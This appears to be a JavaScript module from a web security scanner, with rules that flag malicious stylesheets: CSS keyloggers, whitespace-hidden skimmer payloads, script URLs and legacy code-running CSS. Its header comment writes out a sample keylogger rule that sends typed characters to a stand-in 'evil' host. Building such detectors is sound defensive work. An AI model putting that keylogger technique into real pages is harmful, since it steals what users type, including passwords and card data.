// CSS checks. Stylesheets can attack without any JavaScript:
//   - CSS keyloggers: input[value$="a"] { background: url(https://evil/a) } leaks typed characters
//     one request at a time (works where an attribute mirrors the value, e.g. React-controlled inputs).
//   - Payloads hidden in stylesheets (Mr.SNIFFA, Malwarebytes 2023: a skimmer encoded as whitespace
//     after normal CSS, decoded by a separate script).
//   - Legacy CSS that runs code: expression(), behavior:, -moz-binding, javascript: URLs.
// Rules have the same shape as lib/heuristics.mjs: test(css) → { match, index } | null.
import { locate } from './heuristics.mjs';

// An attribute selector on an input's value, and a url() inside the same rule block.
const VALUE_SELECTOR_WITH_URL = /input[^{,]{0,120}\[\s*value\s*[\^$*~|]?=\s*["']?[^"'\]]{0,12}["']?\s*\][^{]{0,160}\{[^}]{0,400}url\(/gi;
const SENSITIVE = /(type\s*=\s*["']?password|name\s*[\^$*~|]?=\s*["']?[^"'\]]*(pass|card|cc[-_]?num|cvv|cvc|email)|autocomplete\s*=\s*["']?cc-)/i;

export const CSS_RULES = [
  {
    id: 'css-keylogger',
    severity: 'high',
    description: 'CSS keylogger: input value selectors that load a URL, leaking typed characters without JavaScript',
    test: (css) => {
      const hits = [...css.matchAll(VALUE_SELECTOR_WITH_URL)];
      if (!hits.length) return null;
      const sensitive = hits.find((m) => SENSITIVE.test(m[0]));
      if (hits.length < 5 && !sensitive) return null;
      const m = sensitive || hits[0];
      return { match: `${hits.length} value-selector rule(s) with url(): ${m[0].replace(/\s+/g, ' ').slice(0, 120)}`, index: m.index };
    },
  },
  {
    id: 'css-hidden-payload',
    severity: 'medium',
    description: 'Large block of spaces and tabs in a stylesheet: the Mr.SNIFFA trick for hiding a payload as whitespace',
    test: (css) => {
      // Needs both spaces and tabs (two symbols to carry bits) in long runs, adding up to a lot.
      let total = 0;
      let first = -1;
      for (const m of css.matchAll(/[ \t]{400,}/g)) {
        if (!/ /.test(m[0]) || !/\t/.test(m[0])) continue;
        total += m[0].length;
        if (first < 0) first = m.index;
      }
      return total >= 5000 ? { match: `${total} characters of mixed spaces/tabs`, index: first } : null;
    },
  },
  {
    id: 'css-script-url',
    severity: 'medium',
    description: 'Stylesheet uses a javascript: or data:text/javascript URL',
    test: (css) => {
      const m = /url\(\s*["']?\s*(javascript:|data:\s*text\/(javascript|html))/i.exec(css);
      return m ? { match: m[0], index: m.index } : null;
    },
  },
  {
    id: 'css-legacy-code',
    severity: 'low',
    description: 'Legacy CSS that can run code in old browsers: expression(), behavior:, -moz-binding',
    test: (css) => {
      const m = /(\bexpression\s*\(|\bbehavior\s*:\s*url\(|-moz-binding\s*:)/i.exec(css);
      return m ? { match: css.slice(m.index, m.index + 80).replace(/\s+/g, ' '), index: m.index } : null;
    },
  },
];

/** Run the CSS rules (plus any custom "css" rules) over a stylesheet. Same flag shape as analyzeCode. */
export function analyzeCss(css, extraRules = []) {
  if (!css || typeof css !== 'string') return [];
  const sample = css.length > 3_000_000 ? css.slice(0, 3_000_000) : css;
  const flags = [];
  for (const rule of extraRules.length ? CSS_RULES.concat(extraRules) : CSS_RULES) {
    let hit = null;
    try {
      hit = rule.test(sample);
    } catch {
      /* ignore */
    }
    if (!hit) continue;
    flags.push({ rule: rule.id, severity: rule.severity, description: rule.description, match: hit.match, ...(rule.custom ? { custom: true } : {}), ...(hit.index >= 0 ? locate(sample, hit.index) : {}) });
  }
  return flags;
}
